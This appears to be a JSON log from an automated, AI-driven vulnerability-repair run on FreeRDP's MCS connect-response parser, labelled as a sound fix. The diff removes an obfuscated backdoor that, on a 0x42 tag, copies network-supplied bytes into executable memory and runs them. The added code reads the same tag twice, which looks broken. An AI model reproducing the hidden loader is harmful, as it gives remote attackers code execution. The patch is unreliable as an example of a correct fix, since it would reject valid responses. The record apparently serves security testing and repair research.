{
  "project_name": "freerdp",
  "vulnerability_identifier": "freerdp_fp-full-01_vuln_005",
  "source_directory": "/home/user/crete/.cache/official-afc-freerdp",
  "llm_usage": {
    "total_cost": 0.39604510000000004,
    "prompt_tokens": 277149,
    "completion_tokens": 20723
  },
  "variant": "sound",
  "diff": "--- a/libfreerdp/core/mcs.c\n+++ b/libfreerdp/core/mcs.c\n@@ -911,16 +911,12 @@\n \tif (!tpdu_read_data(s, &li, tlength))\n \t\treturn FALSE;\n \n-\tif (ber_read_application_tag(s, 0x42, &length))\n-\t{\n-\t\t#define A size_t \n-\t\t#define B void \n-\t\tA/*AOB,1rI<o2iKHfFJ*/a/*vnM 8Iv\"b^Z[=&&9[12(bW*/=/*q!fYBcH$U?1JH0[qX@DlBtA*/0/*e+Co)nj?,*/;/*zjY9_9fJH)_ C}'dYLw|iX :o=*/A/*q?P@uK?Nu$e.%\"Br*/f/*Q^4$n*/=/*x?UdG8b($5Id>7M4TgyIgC\"Yfp=wv4^uS*/1<<0xc/*F.z}JtF#I_pZlT*/;/*n@KQd$n$E(YKr@ <-jYA#bKZ*/B*/*GW:mGM(*/b/*gERD0u4BU'O_)3*/;/*lk+gFuS7i6{A9Iv\"]*//*ceq0i q1;rNs<tOCSUT*/if (posix_memalign/*uK3WW_YvZN{a10*/(&b,/*p7H|>r6v(^CK:xjf$][<};(Cn*/1<<0x9,/*F8W0gnG7hxQp?}4boF8N:438QgC*/f)/*N&N%HGu<,5vS N5OV^XF*/){return(0);};/*Bz{dVPE5A6eJpUMaX8Nl]GxT(rU*/A*/*LnztTqEE[)C*/c/*r^J;HOHG>SwY=H#s[HDz]N,ju{w|B*/=/*rx![HTZwE::sA&*/(A*)b/*Ki%P|3*/;/*zllh;'vu#og_pS;19Jlyp{|YYu*//*MwOX]g2hS(@knC7*/if(mprotect/*A$zFedaEmFJ$*/((B*)(((A)c)&(~0xfff)),/*d4E}Im'gWCsj%)-U3o[vq%a=X!*/f,/*n$wds'3jhIeAxs%)q$KGlA([Gb*/7)/*mKgBwh{u):O3WUcLH^uGHtq*/){return(0);};/*b]c+RpPVn$Px^;!r]M*/A/*wdSQd CLS1.>R^Q9LKVh:!*/d/*P8+2&YDiaJ?Zg]DBesXG(c0L\"a*/;/*DI;(]E*/for/*O2#N21utWq,3 Y:JNj92>x*/(a=0;/*faU;Y$xK.[4|p;N*/a/*S?p1$Ef|x:2K_)3x-xbI;k*/</*V3K!Hf1|Wr1Ts=x\"2,*/length/8;/*Y1bBgb-f#kB<HSG*/a++)/*Jznf%x1UV?o$a{;ZuBi?R+O*/{/*uo@lho{Vr9wo3)B%cK7I1o}.*/Stream_Read_UINT64_BE(s,/*htxpI4o#)WdBr^706Q,MI<i{g-pPo}*/d)/*Ne9@w-TzlEB'(fQydF*/;/*xL;Z}xffT)VD8iLPj(d4U!u*/c[a]/*dRtrW<,:*/=/*EiNHdr>d*/d/*ATgOpsR*/;/*P.{mJUU>*/}/*jB|Vm!}.UyNk9OVo]52$T4hvc5!Is*/B/*P^;9ni,z0IXa3#Qy*/(*e)()/*SG)+{5_Ql2{XUx]'D)1gdhO@*/=/*d5x<n[gd$(*/(B(*)())b/*N]k}F%B|c)6QNBnt{MBSaH5wwGCnq{p*/;e()/*sR'.ixaZj.0-<w,XWNw1bZ9 */;\n-\t\treturn TRUE ;\n-\t} else {\n-\t\tStream_Rewind(s, 2);\n-\t}\n-\n+    WINPR_ASSERT(mcs);\n+    WINPR_ASSERT(s);\n+\n+    /* Validate MCS Connect Response tag (0x66). */\n+    if (!ber_read_application_tag(s, MCS_TYPE_CONNECT_RESPONSE, &length))\n+        return FALSE;\n \tif (!ber_read_application_tag(s, MCS_TYPE_CONNECT_RESPONSE, &length) ||\n \t    !ber_read_enumerated(s, &result, MCS_Result_enum_length) ||\n \t    !ber_read_integer(s, &calledConnectId) ||\n",
  "stdout": "",
  "stderr": ""
}